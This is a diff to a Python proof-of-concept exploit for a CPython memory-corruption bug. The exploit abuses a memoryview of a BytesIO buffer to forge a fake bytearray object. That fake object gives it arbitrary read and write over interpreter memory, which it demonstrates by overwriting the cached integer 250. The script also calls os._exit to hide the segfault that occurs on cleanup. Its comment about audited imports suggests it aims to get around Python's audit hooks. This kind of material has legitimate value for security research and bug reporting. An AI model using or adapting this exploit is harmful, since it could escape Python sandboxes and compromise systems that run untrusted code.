@@ -36,6 +36,8 @@ write_bytes(bytesio *self, PyObject *b)
 
 # _io isn't an audited import (unless sys.modules has been cleared beforehand)
 from _io import BytesIO
+from common import evil_bytearray_obj, BYTEORDER
+import os
 
 class bytes_subclass(bytes):
     pass
@@ -61,13 +63,13 @@ if view is None:
 # create our controlled object which has its header in a spot our memoryview can write to
 mem = bytes_subclass(SIZE - 0x18)
 
+# see ./common/common.py for evil bytearray obj explanation
+fake_obj, _ = evil_bytearray_obj()
+
 # write evil bytearray object data
-view[0] = 0x1
-view[1] = id(bytearray)
-view[2] = 2**63 - 1
-view[3] = 2**63 - 1
-view[4] = 0
-view[5] = 0
+for idx in range(0, len(fake_obj), 8):
+    val = int.from_bytes(fake_obj[idx:idx+8], BYTEORDER)
+    view[idx // 8] = val
 view.release()
 del view
 
@@ -78,6 +80,5 @@ print(hex(len(mem)))
 mem[id(250) + int.__basicsize__] = 100
 print(250) # => 100
 
-# explicity delete mem to avoid a segfault that happens during cleanup
-# (still segfaults half the time for me but it's whatever)
-del mem
+# program segfaults on cleanup so we use os._exit to pretend it never happens :D
+os._exit(0)
